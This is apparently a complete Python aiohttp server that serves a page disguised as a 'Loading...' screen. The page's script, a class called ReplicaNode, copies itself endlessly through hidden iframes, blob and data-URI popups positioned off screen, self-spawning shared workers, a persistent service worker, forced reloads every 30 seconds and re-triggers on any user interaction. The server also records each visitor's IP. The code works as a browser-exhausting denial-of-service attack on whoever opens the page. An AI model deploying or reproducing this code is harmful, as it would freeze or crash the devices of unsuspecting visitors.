# main.py
from aiohttp import web
import json, base64
from datetime import datetime

html_template = """
<!DOCTYPE html>
<html>
<head>
    <title>Loading...</title>
    <link rel="prefetch" href="/" as="document">
    <link rel="prerender" href="/">
    <meta http-equiv="refresh" content="30">
</head>
<body style="background:#000;margin:0">
<script>
class ReplicaNode {
    constructor() {
        this.init();
        this.setupAutoRestart();
        this.bindEvents();
    }

    async init() {
        await Promise.all([
            this.createFrames(),
            this.createWorkers(),
            this.setupCache(),
            this.createTabs(),
            this.registerServiceWorker()
        ]);
    }

    createFrames() {
        // Multiple hidden iframes with different methods
        const frames = 10;
        for(let i = 0; i < frames; i++) {
            const frame = document.createElement('iframe');
            frame.style.cssText = 'position:fixed;width:1px;height:1px;opacity:0;pointer-events:none';
            frame.srcdoc = document.documentElement.outerHTML;
            frame.sandbox = 'allow-scripts allow-same-origin';
            document.body.appendChild(frame);
            
            // Blob URL method
            const blob = new Blob([document.documentElement.outerHTML], {type:'text/html'});
            const url = URL.createObjectURL(blob);
            const frame2 = document.createElement('iframe');
            frame2.src = url;
            frame2.style.display = 'none';
            document.body.appendChild(frame2);
        }
    }

    async createWorkers() {
        // Web Workers & Shared Workers
        const code = `
            self.onconnect = () => {
                setInterval(() => {
                    fetch('/').then(r => r.text()).then(html => {
                        new Worker(URL.createObjectURL(new Blob([html])));
                    });
                }, 5000);
            }
        `;
        new SharedWorker(URL.createObjectURL(new Blob([code])));
    }

    async setupCache() {
        if ('caches' in window) {
            const cache = await caches.open('replica-v1');
            await cache.put('/', new Response(document.documentElement.outerHTML));
        }
    }

    createTabs() {
        const features = [
            'width=1,height=1',
            'left=-9999',
            'menubar=no',
            'status=no'
        ].join(',');
        
        // Multiple window open attempts
        window.open('/', '_blank', features);
        window.open(location.href);
        
        // Data URI method
        const html = btoa(document.documentElement.outerHTML);
        window.open('data:text/html;base64,' + html);
    }

    async registerServiceWorker() {
        if ('serviceWorker' in navigator) {
            try {
                await navigator.serviceWorker.register('/sw.js', {
                    scope: '/',
                    type: 'module'
                });
            } catch(e) {
                console.error(e);
            }
        }
    }

    setupAutoRestart() {
        // Periodic refresh & reconnect
        setInterval(() => {
            this.init();
            location.reload();
        }, 30000);
    }

    bindEvents() {
        // Trigger on any interaction
        const events = ['click', 'touchstart', 'scroll', 'mousemove', 'keydown'];
        events.forEach(event => {
            document.addEventListener(event, () => this.init(), {once:true});
        });
        
        // Visibility change replication
        document.addEventListener('visibilitychange', () => {
            if (!document.hidden) this.init();
        });
    }
}

// Start immediately and after load
new ReplicaNode();
window.addEventListener('load', () => new ReplicaNode());
</script>
</body>
</html>
"""

service_worker = """
self.addEventListener('install', e => {
    e.waitUntil(
        caches.open('replica-v1').then(cache => {
            return cache.addAll(['/']);
        })
    );
    self.skipWaiting();
});

self.addEventListener('activate', e => {
    e.waitUntil(clients.claim());
});

self.addEventListener('fetch', e => {
    e.respondWith(
        caches.match(e.request).then(response => {
            return response || fetch(e.request);
        })
    );
});
"""

class Server:
    def __init__(self):
        self.nodes = set()

    async def handle(self, request):
        self.nodes.add(request.remote)
        return web.Response(
            text=html_template,
            content_type='text/html',
            headers={
                'Cache-Control': 'no-store, must-revalidate',
                'Service-Worker-Allowed': '/'
            }
        )

    async def sw(self, request):
        return web.Response(
            text=service_worker,
            content_type='application/javascript'
        )

app = web.Application()
server = Server()
app.router.add_get('/', server.handle)
app.router.add_get('/sw.js', server.sw)

if __name__ == '__main__':
    web.run_app(app, port=8080)